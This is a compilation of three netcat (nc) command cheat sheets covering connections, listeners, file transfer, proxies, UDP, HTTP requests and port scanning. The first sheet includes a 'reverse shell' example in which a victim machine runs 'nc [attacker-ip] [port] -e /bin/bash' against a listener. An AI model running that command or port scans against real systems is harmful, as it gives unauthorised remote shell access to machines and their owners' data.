cheat.sheets:nc
# nc
# Versatile networking utility to read and write data across networks.
# Basic client use - connect to a server
nc [hostname] [port]
# Basic server use - listen on a specific port
nc -l -p [port]
# Send a file from a client to a server
# Server side
nc -l -p [port] > [output-file]
# Client side
nc [hostname] [port] < [input-file]
# Create a simple chat server
# Server side
nc -l -p [port]
# Client side
nc [hostname] [port]
# Port scanning a host for open ports
nc -zv [hostname] [starting-port]-[ending-port]
# Using UDP instead of TCP
nc -u [hostname] [port]
# Use with a timeout setting
nc -w [timeout-in-seconds] [hostname] [port]
# Listen for connections on multiple interfaces
nc -l -p [port] -k
# Establish a reverse shell (use with caution)
# Attacker machine - listen for incoming connections
nc -l -p [port]
# Victim machine - connect to attacker
nc [attacker-ip] [port] -e /bin/bash
 cheat:nc
---
tags: [ networking ]
---
# To open a TCP connection from <src-port> to <dest-port> of <dest-host>, with a timeout of <seconds>
nc -p <src-port> -w <seconds> <dest-host> <dest-port>
# To open a UDP connection to <dest-port> of <dest-host>:
nc -u <dest-host> <dest-port>
# To open a TCP connection to port 42 of <host> using <source-host> as the IP for the local end of the connection:
nc -s <source-host> <dest-host> <port>
# To create and listen on a UNIX-domain stream socket:
nc -lU /var/tmp/dsocket
# To connect to <dest-port> of <dest-host> via an HTTP proxy at <proxy-host>,
# <proxy-port>. This example could also be used by ssh(1); see the ProxyCommand
# directive in ssh_config(5) for more information.
nc -x<proxy-host>:<proxy-port> -Xconnect <dest-host> <dest-port>
# The same example again, this time enabling proxy authentication with username "ruser" if the proxy requires it:
nc -x<proxy-host>:<proxy-port> -Xconnect -Pruser <host> <port>
# To choose the source IP for the testing using the -s option
nc -zv -s source_IP target_IP Port
 tldr:nc
# nc
# Netcat is a versatile utility for working with TCP or UDP data.
# More information: <https://manned.org/man/nc.1>.
# Establish a TCP connection:
nc ip_address port
# Set a timeout:
nc -w timeout_in_seconds ipaddress port
# Scan the open TCP ports of a specified host:
nc -v -z ip_address port
# Listen on a specified TCP port and print any data received:
nc -l port
# Keep the server up after the client detaches:
nc -k -l port
# Listen on a specified UDP port and print connection details and any data received:
nc -u -l port
# Act as proxy and forward data from a local TCP port to the given remote host:
nc -l local_port | nc hostname remote_port
# Send a HTTP request:
echo -e "GET / HTTP/1.1\nHost: hostname\n\n" | nc hostname 80
